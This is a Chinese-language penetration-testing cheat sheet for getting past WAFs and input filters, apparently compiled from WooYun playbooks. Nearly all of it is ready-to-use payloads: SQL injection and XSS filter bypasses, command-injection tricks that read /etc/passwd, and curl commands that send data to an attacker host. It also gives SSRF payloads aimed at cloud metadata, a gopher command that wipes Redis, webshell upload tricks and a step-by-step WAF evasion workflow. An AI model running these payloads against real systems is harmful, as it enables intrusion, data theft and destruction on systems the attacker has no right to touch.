# 通用绕过工具箱

> 综合改写自 `core/bypass_strategies.md` + 各 wooyun playbook 的 bypass 章节
> 视角：黑盒，被 WAF / 过滤器 / 业务校验拦了，怎么继续

---

## 1. 绕过的本质

```
绕过 = 解析差异 + 边界 corner case + 防护盲区

每次被拦时问自己：
  Q1. 防护组件和后端的解析是否一致？（前置 WAF vs Tomcat、CDN vs 源站）
  Q2. 防护是否覆盖所有 corner case？（双编码、混合 case、长度溢出）
  Q3. 防护是否覆盖所有入口？（Header、Cookie、HPP、其他动词）
```

通用决策树：

```
Payload 被拦
 ├─ 看返回是 WAF？应用？还是源站？
 │   ├─ WAF 拦 → 协议层绕过（HPP / Chunked / 大小写 / Content-Type）
 │   └─ 应用拦 → 编码层 / 语义层（双写、注释、等价函数）
 ├─ 看是黑名单还是白名单
 │   ├─ 黑名单 → 找漏掉的关键字 / 同义词
 │   └─ 白名单 → 找白名单允许的危险用法
 └─ 看是输入过滤还是输出编码
     ├─ 输入过滤 → 多重编码 / 二次注入
     └─ 输出编码 → 上下文逃逸（HTML→JS、URL→JS）
```

---

## 2. SQLi 绕过表（分维度）

### 2.1 关键字过滤
| 技巧 | Payload | 适用 |
|------|---------|------|
| 大小写 | `UnIoN SeLeCt` | 黑名单纯 lower 检测 |
| 双写 | `UNunionION SELselectECT` | 一次替换型过滤器 |
| 注释插入 | `un/**/ion sel/**/ect` | 空白符过滤 |
| MySQL 内联注释 | `/*!50000union*//*!50000select*/` | 经典 WooYun 案例 |
| 同义词 | `\|\|` 代 `OR`，`&&` 代 `AND` | 关键字 OR/AND 过滤 |
| 等号替换 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` | `=` 过滤 |
| 函数等价 | `mid()`/`substr()`/`substring()`/`left()` | 子串函数过滤 |

### 2.2 空格过滤
```
/**/   %09(Tab)   %0a(LF)   %0d(CR)   %0b   %0c
括号嵌套：select(user)from(dual)
反引号（MySQL）：`select`user`from`
加号（URL 参数位）：select+user+from
```

### 2.3 引号绕过
```
0x61646D696E              （hex，'admin'）
char(97,100,109,105,110)
%df%27                    （GBK 宽字节）
```

### 2.4 数字型注入（无需引号）
```
id=1 AND 1=1
id=1 AND sleep(5)
id=1 AND IF(SUBSTRING(user(),1,1)='r',sleep(5),0)
```

### 2.5 时间盲注的双层延时（绕过 sleep 关键字）
```
id=(select(2)from(select(sleep(8)))v)        # WooYun-2015-0114228
id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))
id=1 AND dbms_pipe.receive_message('a',5)=1   # Oracle
id=1; WAITFOR DELAY '0:0:5'--                 # MSSQL
```

---

## 3. XSS 绕过表

### 3.1 标签过滤
```
<ScRiPt>   <script/x>   <script\n>   <script\t>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### 3.2 事件库（按罕见度，越往下越能打 WAF）
```
onerror onload onclick onmouseover                  # 已被多数 WAF 收录
onfocus onblur oninput onchange autofocus           # 中等
onanimationend ontransitionend ontoggle ontouchstart
onpointerenter oncanplay onauxclick onbeforeprint   # 罕见
```

### 3.3 关键字 / 括号绕过
```
alert(1)                # Unicode
eval('al'+'ert(1)')          # 拼接
Function('alert(1)')()       # 构造器
window['al'+'ert'](1)
String.fromCharCode(97,108,101,114,116,40,49,41)
alert`1`                     # 模板字符串绕括号
throw onerror=alert,1
location='javascript:alert(1)'
```

### 3.4 编码层（按上下文）
| 上下文 | 编码 | 示例 |
|--------|------|------|
| HTML | 实体 | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| HTML | 16 进制实体 | `&#x3c;script&#x3e;` |
| JS 字符串 | Unicode | `<iframe/onload=alert(1)>` |
| URL | data: + base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| CSS（IE） | 16 进制 | `xss:\65\78\70\72\65\73\73\69\6f\6e(1)` |

### 3.5 上下文逃逸快表
| 输出位置 | 闭合 | Payload |
|---------|------|---------|
| `<div>HERE</div>` | 标签 | `<svg onload=alert(1)>` |
| `<input value="HERE">` | 引号 | `" autofocus onfocus=alert(1) "` |
| `<a href="HERE">` | 协议 | `javascript:alert(1)` |
| `<script>var x="HERE"</script>` | 引号 | `";alert(1);//` |
| `<script>var x={"k":"HERE"}</script>` | JSON | `'-alert(1)-'` 或 `"};alert(1);//` |

---

## 4. 命令注入绕过表

### 4.1 拼接符
```
Linux:    ;   |   ||   &&   &   `cmd`   $(cmd)   %0a(LF)
Windows:  &   |   ||   &&   %0a
```

### 4.2 空格绕过
```
${IFS}        cat${IFS}/etc/passwd
${IFS}$9      cat${IFS}$9/etc/passwd
%09(Tab)      cat%09/etc/passwd
{a,b}         {cat,/etc/passwd}
重定向        cat</etc/passwd
```

### 4.3 关键字绕过
```
c'a't  c"a"t  c\at         # 引号 / 反斜杠分割
a=ca;b=t;$a$b /etc/passwd  # 变量拼接
/bin/c?t /etc/passwd       # 通配符
/???/??t /etc/p??s??       # 全通配
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh    # base64 嵌套  # security-allowlist: SEC008
```

### 4.4 cat 替代品（命令字过滤时）
```
tac head tail more less nl sort uniq od xxd base64 rev paste strings
# 全部能读出文件内容
```

### 4.5 无回显外带
```bash
# DNSLog
ping `whoami`.xxx.dnslog.cn
curl `cat /etc/passwd | base64 | tr -d '\n'`.xxx.dnslog.cn

# HTTP 外带
curl https://attacker.cc/?d=`whoami`
curl -X POST -d "$(cat /etc/passwd | base64)" https://attacker.cc/

# 时间外带（盲）
if [ `id -u` -eq 0 ]; then sleep 5; fi
```

---

## 5. 路径遍历 / 文件读绕过表

### 5.1 编码梯度
```
../        →  %2e%2e%2f
../        →  %252e%252e%252f      （双重 URL）
../        →  ..%c0%af / ..%c1%9c   （超长 UTF-8，旧 Tomcat / GlassFish）
../        →  %u002e%u002e%u2215    （IIS / 旧版 Java）
../        →  ....// / ..../        （过滤器删一次后剩下原型）
```

### 5.2 截断 / 协议
```
%00              ../../../etc/passwd%00.jpg     # PHP <5.3.4 / 旧 Java
;                /admin;.jpg                    # IIS / Tomcat
file://          file:///etc/passwd
view-source:     view-source:file:///etc/passwd
php://filter     php://filter/convert.base64-encode/resource=index.php
```

### 5.3 目录跳板
```
/.            //          /./           /../         /;/
/static/../config         /assets/..%2fapp/config.yml
```

---

## 6. SSRF 绕过表

### 6.1 IP 表示法
```
http://127.0.0.1
http://2130706433             # 十进制
http://0177.0.0.1             # 八进制
http://0x7f.0x0.0x0.0x1       # 16 进制
http://127.1                  # 简写
http://[::1]                  # IPv6
http://[::ffff:127.0.0.1]
```

### 6.2 域名绕过
```
http://127.0.0.1.nip.io       # 公共解析回环
http://localtest.me           # 同上
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
DNS Rebinding                 # 第一次查询返回外网，第二次返回内网（rbndr.us、tartarsauce.org）
```

### 6.3 协议
```
file://     file:///etc/passwd
gopher://   gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
dict://     dict://127.0.0.1:6379/info
ldap://     ldap://attacker.com/
ftp://      ftp://attacker.com/
```

### 6.4 云元数据（必试）
```
AWS         http://169.254.169.254/latest/meta-data/
AWS-IMDSv2  curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
GCP         http://metadata.google.internal/computeMetadata/v1/    Header: Metadata-Flavor: Google
Azure       http://169.254.169.254/metadata/instance?api-version=2021-02-01    Header: Metadata: true
阿里云      http://100.100.100.200/latest/meta-data/
腾讯云      http://metadata.tencentyun.com/latest/meta-data/
```

---

## 7. WAF 通用绕过

### 7.1 协议层
| 技巧 | 说明 |
|------|------|
| HPP（HTTP Parameter Pollution） | `?id=1&id=2' OR 1=1--`，前/后端取的参数不同 |
| Chunked Transfer-Encoding | `Transfer-Encoding: chunked` 让 WAF 看不到完整 body |
| Content-Type 混淆 | multipart 边界混淆 / 改为 `application/xml` 让 WAF 不解析 |
| HTTP 方法覆盖 | `X-HTTP-Method-Override: PUT`、`_method=DELETE` |
| HTTP/2 vs HTTP/1 转换差异 | 见 `playbooks/http-smuggling.md` |
| 大小写 Header | `cONTENT-tYPE` 某些 WAF 不认 |

### 7.2 编码层
```
1. 多重编码：URL → HTML 实体 → Unicode 三重套娃
2. 字符集：GBK 宽字节 / UTF-7 / UTF-16
3. Content-Encoding: gzip 压缩 body
```

### 7.3 长度 / 拆分
```
1. 超长参数（超过 WAF 检测窗口，常见 8KB / 16KB）
2. 多参数组合：part1=SEL part2=ECT
3. 二次注入：先存进 DB，再触发
4. 冷门入口：Cookie / Referer / X-Forwarded-For / User-Agent
```

---

## 8. 文件上传绕过表

| 检测层 | 绕过 |
|--------|------|
| 客户端 JS | 禁用 JS / Burp 拦响应 |
| 扩展名黑名单 | `.Php`、`.pHp`、`.php3/.php5/.phtml/.phar`、`.PHP%20`、`.php.` |
| 扩展名白名单 | `%00` 截断（旧版 PHP/Java）、`shell.jpg/.php`（Nginx fix_pathinfo）、`shell.asp;.jpg`（IIS6）、`.jspx` |
| Content-Type | 改 `image/jpeg`、`image/gif` |
| 文件头 | 加 `GIF89a\n<?php ...?>` 或 `\x89PNG...` |
| 内容静态特征 | 变量函数 `$a='ass'.'ert'; $a($_POST['x']);`、`array_map('assert',$_POST)` |
| 二次渲染 | 把 payload 放在 EXIF、IDAT 块，渲染后仍可读 |
| 路径绕过 | `filename=../../web/shell.php`，旧版 ZipSlip |
| 解析配置 | Apache 多后缀 `.php.xxx` 从右向左、Nginx `/x.jpg/.php` |

---

## 9. 上传后访问路径不返回？

```
1. 抓包看响应是否含完整 URL
2. 看预览功能（很多 CMS 上传后能预览）
3. 看上传时间戳命名规则（`20140829221136jsp.jsp` 模式 → 时间爆破 ±60 秒）
4. 编辑器自带浏览功能（FCKeditor /connectors/...?Command=GetFoldersAndFiles&CurrentFolder=/../）
5. 配合任意文件读 / .git 泄露反推目录
```

---

## 10. Corner Case 速查清单

每发新 payload 前过一遍这张表：

- [ ] 双重 URL 编码（`%252e`）
- [ ] Unicode 变体（`%u0027`、`'`）
- [ ] 宽字节（GBK，`%df%27`）
- [ ] Overlong UTF-8（`%c0%ae` = `.`）
- [ ] 混合编码（部分编码 + 部分明文）
- [ ] 注释嵌套（`/*!50000select*/`）
- [ ] 科学计数法 / 浮点（`1e0union`、`1.0union`）
- [ ] 负数 / 0（`-1 UNION`、`0 OR`）
- [ ] 制表 / 换页（`\t \v \f \r`）
- [ ] HPP（重复参数）
- [ ] Chunked / Content-Encoding gzip
- [ ] 重复 Header（重复 Host、重复 CL）
- [ ] 路径规范化差异（`//`、`/./`、`/;param`、尾斜杠）
- [ ] JSON 重复 key（取首 / 取末）
- [ ] XML DTD（`<!ENTITY xxe SYSTEM "file:///etc/passwd">`）

---

## 11. 实战工作流（被拦了怎么办）

```
1. 先确认是谁拦的
   → 看响应头：Server / X-WAF / 错误页特征 / 状态码（403 / 406 / 418）
   → 同一参数发普通字符串看是否过；只在恶意 payload 触发就是 WAF

2. 识别 WAF
   → wafw00f https://target
   → 看常见特征：Cloudflare（cf-ray）、ModSecurity、AWS WAF、阿里云盾、长亭雷池

3. 选第一道绕过：
   → 编码层（最便宜）：URL 双编码 → Unicode → 实体
   → 语义层：等价函数 / 注释 / 大小写
   → 协议层：HPP / Chunked / 改 method / 改 Content-Type

4. 第一道失败：
   → 拆 payload（多参数组合 / 超长前缀填充 / Cookie 走私）
   → 切入口（Header → Cookie → JSON body → multipart）

5. 还失败：
   → 二次注入（先存再触发）
   → 切目标（如果是 SaaS 多租户，换租户域名 / 子域）
   → 记录"防护有效"，去打下一个端点
```
